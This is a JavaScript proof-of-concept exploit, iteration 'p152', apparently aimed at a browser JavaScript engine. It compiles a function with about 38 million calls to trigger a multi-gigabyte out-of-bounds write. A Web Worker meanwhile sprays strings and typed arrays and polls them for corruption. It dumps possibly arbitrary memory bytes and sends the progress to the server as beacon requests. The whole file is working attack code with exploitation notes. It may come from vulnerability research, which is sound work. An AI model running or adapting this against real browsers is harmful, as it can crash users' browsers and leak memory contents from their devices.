// p152 — Worker polling with absolute URL beacons
// KEY INSIGHT: finishCreation runs LAZILY on first CALL, not during <script> compile.
//   COMPILED-OK just means the global scope compiled. The 38M function's CodeBlock
//   is created when we call it → finishCreation → 4.29GB OOB write → crash.
//   Worker must poll DURING the call to catch the corruption window.
// FIX from p151: Worker XHR uses absolute URLs (blob origin can't resolve relative).
// Beacon prefix: V152-

(function() {
  var BASE = location.protocol + '//' + location.host;

  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V152-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  // Worker code — uses absolute URL for beacons
  var workerCode = [
    'var BASE = "' + BASE + '";',
    'var STR_LEN = 100076;',
    'var CANARY = 0x41;',
    'var U8_SZ = 64;',
    'var U8_CANARY = 0xBB;',
    '',
    'function beacon(tag) {',
    '  try {',
    '    var x = new XMLHttpRequest();',
    '    x.open("GET", BASE + "/beacon/V152-W-" + tag + "?t=" + Date.now(), true);',
    '    x.send();',
    '  } catch(e) {',
    '    self.postMessage("BEACON-FAIL:" + tag);',
    '  }',
    '}',
    '',
    'function hexByte(v) { return (v < 16 ? "0" : "") + v.toString(16); }',
    '',
    '// Allocate string targets — go into Worker MarkedSpace',
    'var strs = [];',
    'for (var i = 0; i < 40; i++) {',
    '  var s = String.fromCharCode(CANARY).repeat(STR_LEN);',
    '  s.charCodeAt(0);',  // force materialization
    '  strs.push(s);',
    '}',
    '',
    '// Allocate Uint8Array targets — cells in Worker MarkedSpace',
    'var u8s = [];',
    'for (var i = 0; i < 60; i++) {',
    '  var u = new Uint8Array(U8_SZ);',
    '  for (var j = 0; j < U8_SZ; j++) u[j] = U8_CANARY;',
    '  u8s.push(u);',
    '}',
    '',
    'beacon("READY-S" + strs.length + "-U" + u8s.length);',
    'self.postMessage("READY");',
    '',
    'var strHits = 0;',
    'var u8Hits = 0;',
    'var pollCount = 0;',
    'var done = false;',
    'var reported = {};',
    '',
    'function poll() {',
    '  if (done) return;',
    '  pollCount++;',
    '',
    '  // Check strings for corruption',
    '  for (var i = 0; i < strs.length; i++) {',
    '    try {',
    '      var len = strs[i].length;',
    '      if (len !== STR_LEN && !reported["s" + i]) {',
    '        strHits++;',
    '        reported["s" + i] = true;',
    '        beacon("S" + i + "-len=" + len + "-p=" + pollCount);',
    '        self.postMessage("SCORRUPT:" + i + ":" + len + ":" + pollCount);',
    '',
    '        // Try reading bytes from corrupted string',
    '        if (len > 0 && len < 500000) {',
    '          var hex = "";',
    '          var readLen = Math.min(64, len);',
    '          for (var j = 0; j < readLen; j++) {',
    '            try { hex += hexByte(strs[i].charCodeAt(j)); }',
    '            catch(e) { hex += "XX"; break; }',
    '          }',
    '          beacon("SD" + i + "-" + hex.substring(0, 120));',
    '          self.postMessage("SDATA:" + i + ":" + hex);',
    '        }',
    '      }',
    '    } catch(e) {',
    '      if (!reported["se" + i]) {',
    '        reported["se" + i] = true;',
    '        strHits++;',
    '        beacon("SERR" + i + "-p=" + pollCount);',
    '        self.postMessage("SERR:" + i + ":" + pollCount);',
    '      }',
    '    }',
    '  }',
    '',
    '  // Check Uint8Arrays for corruption',
    '  for (var i = 0; i < u8s.length; i++) {',
    '    try {',
    '      var v0 = u8s[i][0];',
    '      var vLen = u8s[i].length;',
    '      if ((v0 !== U8_CANARY || vLen !== U8_SZ) && !reported["u" + i]) {',
    '        u8Hits++;',
    '        reported["u" + i] = true;',
    '        beacon("U" + i + "-v0=" + hexByte(v0) + "-len=" + vLen + "-p=" + pollCount);',
    '        self.postMessage("UCORRUPT:" + i + ":" + v0 + ":" + vLen + ":" + pollCount);',
    '',
    '        // Dump bytes — if m_vector corrupted, this reads arbitrary memory!',
    '        var hex = "";',
    '        var readLen = Math.min(128, vLen);',
    '        for (var j = 0; j < readLen; j++) {',
    '          try { hex += hexByte(u8s[i][j]); }',
    '          catch(e) { hex += "XX"; break; }',
    '        }',
    '        for (var c = 0; c < hex.length; c += 120) {',
    '          beacon("UD" + i + "-" + c + "-" + hex.substring(c, c + 120));',
    '        }',
    '        self.postMessage("UDATA:" + i + ":" + hex);',
    '      }',
    '    } catch(e) {',
    '      if (!reported["ue" + i]) {',
    '        reported["ue" + i] = true;',
    '        u8Hits++;',
    '        beacon("UERR" + i + "-p=" + pollCount);',
    '        self.postMessage("UERR:" + i + ":" + pollCount);',
    '      }',
    '    }',
    '  }',
    '',
    '  if (strHits > 0 || u8Hits > 0) {',
    '    beacon("FOUND-S" + strHits + "-U" + u8Hits + "-p=" + pollCount);',
    '    self.postMessage("DONE:S" + strHits + ":U" + u8Hits + ":P" + pollCount);',
    '    done = true;',
    '    return;',
    '  }',
    '',
    '  // Poll aggressively during the critical window',
    '  if (pollCount < 10000) {',
    '    setTimeout(poll, 1);',
    '  } else {',
    '    beacon("TIMEOUT-" + pollCount);',
    '    self.postMessage("TIMEOUT:" + pollCount);',
    '    done = true;',
    '  }',
    '}',
    '',
    '// Start polling immediately — must be running before main thread calls fn',
    'setTimeout(poll, 5);',
  ].join('\n');

  var workerBlob = new Blob([workerCode], { type: 'application/javascript' });
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);

  // Relay Worker messages as beacons (backup if Worker XHR fails)
  worker.onmessage = function(ev) {
    B('WM-' + String(ev.data).substring(0, 80));
  };

  B('WORKER-CREATED');

  // Wait for Worker to be ready, then build + call
  var readyTimeout = setTimeout(function() {
    B('WORKER-READY-TIMEOUT');
    startBuild();
  }, 3000);

  worker.addEventListener('message', function handler(ev) {
    if (ev.data === 'READY') {
      clearTimeout(readyTimeout);
      B('WORKER-READY');
      // Small delay so Worker has polls queued
      setTimeout(startBuild, 200);
      worker.removeEventListener('message', handler);
    }
  });

  function startBuild() {
    var N = 38348816;
    B('BUILD');

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__p152fn=function(a){';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__p152ok=1;';
    callChunk = null;

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__p152ok ? 'OK' : 'FAIL'));
      if (!window.__p152fn) { B('NO-FN'); return; }

      // CRITICAL: Calling the function triggers finishCreation → 4.29GB OOB write
      // Worker is already polling. The call will likely crash, but Worker might
      // capture corruption before that.
      setTimeout(function() {
        B('CALLING');
        try {
          window.__p152fn(function(){});
          B('SURVIVED');
        } catch(ex) {
          B('CATCH-' + String(ex).substring(0, 40));
        }
        // If we survive (unlikely), report
        B('AFTER-CALL');
      }, 100);
    };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
